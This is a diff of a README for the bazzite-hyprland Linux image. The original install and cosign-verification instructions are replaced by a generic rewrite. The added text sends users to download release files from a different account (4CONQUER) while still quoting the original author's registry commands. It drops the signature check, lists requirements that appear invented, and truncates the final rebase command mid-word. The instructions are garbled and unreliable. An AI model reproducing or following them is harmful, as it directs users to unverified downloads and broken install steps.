@@ -1,43 +1,89 @@
-# bazzite-hyprland &nbsp; [![bluebuild build badge](https://github.com/c0mpile/bazzite-hyprland/actions/workflows/build.yml/badge.svg)](https://github.com/c0mpile/bazzite-hyprland/actions/workflows/build.yml)
+# 🎉 bazzite-hyprland - Experience a Stable, Custom Linux Environment
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/4CONQUER/bazzite-hyprland/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to bazzite-hyprland! This guide will help you download and install our application easily, giving you a smooth, custom Linux experience.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To get started, visit the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/releases) to download the latest version.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/c0mpile/bazzite-hyprland:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/c0mpile/bazzite-hyprland:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+1. Go to the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/releases).
+2. Find the version you want to install.
+3. Click on the appropriate file for your system to begin downloading.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🛠️ System Requirements
 
-## ISO
+Before installing, ensure your system meets these requirements:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- **Operating System:** Fedora 35 or later
+- **Architecture:** x86_64
+- **Disk Space:** At least 2 GB available
+- **Memory:** Minimum of 4 GB RAM
 
-## Verification
+## 💾 Installation Steps
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+After downloading the file, follow these installation steps:
 
-```bash
-cosign verify --key cosign.pub ghcr.io/c0mpile/bazzite-hyprland
-```
+1. Open your terminal.
+2. Navigate to the directory where the download is located.
+
+   ```
+   cd ~/Downloads
+   ```
+
+3. First, rebase to the unsigned image to get the proper signing keys and policies installed:
+
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/c0mpile/bazzite-hyprland:latest
+   ```
+
+4. Reboot your system to complete the rebase:
+
+   ```
+   systemctl reboot
+   ```
+
+5. After rebooting, rebase to the signed image:
+
+   ```
+   rpm-ostree rebase ostree-im
+   ```
+
+## 🔍 Features
+
+bazzite-hyprland offers several unique features designed for both stability and customization:
+
+- **Custom Linux Environment:** Tailored for users seeking an optimized Linux experience.
+- **BlueBuild Support:** Easily set up and manage your repositories.
+- **Atomic Updates:** Quickly apply system updates without interruptions.
+
+## 🔒 Important Note
+
+This is an experimental feature. Use it at your own discretion. Refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for customizing your image.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues during installation, consider these tips:
+
+- Ensure you have the latest Fedora version installed.
+- Check your system requirements again.
+- Review any error messages in your terminal for guidance.
+
+## 📞 Support
+
+For further assistance, feel free to open an issue on our [GitHub repository](https://github.com/4CONQUER/bazzite-hyprland/issues). We are here to help you!
+
+## ⚙️ Contributing
+
+We welcome contributions! If you're interested in helping improve bazzite-hyprland, check out our [contributing guidelines](https://github.com/4CONQUER/bazzite-hyprland/blob/main/CONTRIBUTING.md) for more information.
+
+## 🗂️ License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/4CONQUER/bazzite-hyprland/blob/main/LICENSE) file for details.
+
+---
+
+Thank you for choosing bazzite-hyprland! Enjoy your custom Linux environment.
